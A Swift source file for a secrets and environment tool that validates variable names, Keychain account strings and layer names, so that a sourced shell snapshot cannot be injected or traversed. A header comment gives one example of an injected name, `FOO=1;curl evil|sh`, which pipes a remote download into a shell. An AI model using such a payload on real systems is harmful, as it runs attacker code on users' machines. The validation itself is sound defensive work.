// Field shell-safety validation (PROPOSAL-001, security gate G3).
//
// Layer files are "plaintext, shareable" (design §2.3). A variable NAME is interpolated
// nakedly into the sourced snapshot — `export <name>=...` / `unset <name>` (Serialize.swift)
// — so an unvalidated name like `FOO=1;curl evil|sh` would become a line that executes on
// `source`. (Values and accounts are quoted/escaped in Serialize.swift; the name is the
// one field left of `=`, unquotable, so it MUST be validated, not escaped.)
//
// This is the single source of truth for "what is a legal field". It is enforced at the
// two — and only two — boundaries where a name enters the model: `loadLayer` (every file
// load) and the CLI's `secret set/rm` / scene-target paths (argv input). Because those are
// the sole producers of named entries in v1, Serialize.swift can keep interpolating names
// safely. Validation deliberately does NOT live in the VarEntry factories or in serialize,
// so the G1 escaping test (which feeds serialize a deliberately tricky account directly)
// still exercises the escaping wall as defense-in-depth.
//
// Error messages locate the offending layer file + field and never contain a secret value
// (a variable name / account / layer name is not a secret) — extending the Err.Display
// no-key red line.

public extension EnvCueCore {
    /// Validate a shell variable name. POSIX env-name grammar `^[A-Za-z_][A-Za-z0-9_]*$`,
    /// and a hard rejection of `PATH` — envcue performs zero PATH operations (NFR-4); PATH
    /// is permanently delegated to mise/direnv. Throws a readable, value-free error.
    static func validateVarName(_ name: String, layer: String) throws {
        if name == "PATH" {
            throw EnvCueCoreError.pathManagedExternally(layer: layer)
        }
        guard isValidVarName(name) else {
            throw EnvCueCoreError.illegalVarName(name: name, layer: layer)
        }
    }

    /// Validate a Keychain account reference. Form is `{layer}/{VAR}` (design §3): letters,
    /// digits, `_ / . -` only — no whitespace, quotes, `$`, backtick, or control characters
    /// that could break the `$(envcue keychain-get --account '<account>')` line on `source`.
    static func validateAccount(_ account: String, layer: String, variable: String) throws {
        guard isValidAccount(account) else {
            throw EnvCueCoreError.illegalAccount(layer: layer, variable: variable)
        }
    }

    /// Validate a layer name (used as a filename component and as the account prefix):
    /// letters, digits, `_ -`. Prevents path traversal (`../`) and account corruption.
    static func validateLayerName(_ layer: String) throws {
        guard isValidLayerName(layer) else {
            throw EnvCueCoreError.illegalLayerName(layer: layer)
        }
    }

    // MARK: - Character-set predicates

    private static func isAlpha(_ c: Unicode.Scalar) -> Bool {
        (c >= "A" && c <= "Z") || (c >= "a" && c <= "z") || c == "_"
    }

    private static func isDigit(_ c: Unicode.Scalar) -> Bool {
        c >= "0" && c <= "9"
    }

    private static func isValidVarName(_ s: String) -> Bool {
        let scalars = s.unicodeScalars
        guard let first = scalars.first, isAlpha(first) else { return false }
        return scalars.dropFirst().allSatisfy { isAlpha($0) || isDigit($0) }
    }

    private static func isValidAccount(_ s: String) -> Bool {
        guard !s.isEmpty else { return false }
        return s.unicodeScalars.allSatisfy {
            isAlpha($0) || isDigit($0) || $0 == "/" || $0 == "." || $0 == "-"
        }
    }

    private static func isValidLayerName(_ s: String) -> Bool {
        guard !s.isEmpty else { return false }
        return s.unicodeScalars.allSatisfy { isAlpha($0) || isDigit($0) || $0 == "-" }
    }
}
